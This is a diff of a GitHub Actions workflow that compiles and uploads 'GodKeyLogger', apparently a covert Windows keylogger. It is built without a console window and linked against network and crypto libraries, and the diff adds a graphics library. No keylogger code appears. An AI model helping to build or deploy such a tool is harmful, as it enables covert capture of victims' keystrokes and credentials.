@@ -1,4 +1,4 @@
-name: Build GodKeyLogger
+name: 🏗️ Build GodKeyLogger
 on: [push]
 
 jobs:
@@ -8,14 +8,13 @@ jobs:
     steps:
     - uses: actions/checkout@v4
     
-    # This action sets up everything correctly
     - name: Setup Visual Studio
       uses: ilammy/msvc-dev-cmd@v1
-    
+      
     - name: Build
       shell: cmd
       run: |
-        cl /EHsc /O2 GodKeyLogger.cpp /link /SUBSYSTEM:WINDOWS /OUT:GodKeyLogger.exe user32.lib gdi32.lib advapi32.lib winhttp.lib crypt32.lib
+        cl /EHsc /O2 GodKeyLogger.cpp /link /SUBSYSTEM:WINDOWS /OUT:GodKeyLogger.exe user32.lib gdi32.lib advapi32.lib winhttp.lib crypt32.lib gdiplus.lib
         
     - uses: actions/upload-artifact@v4
       with:
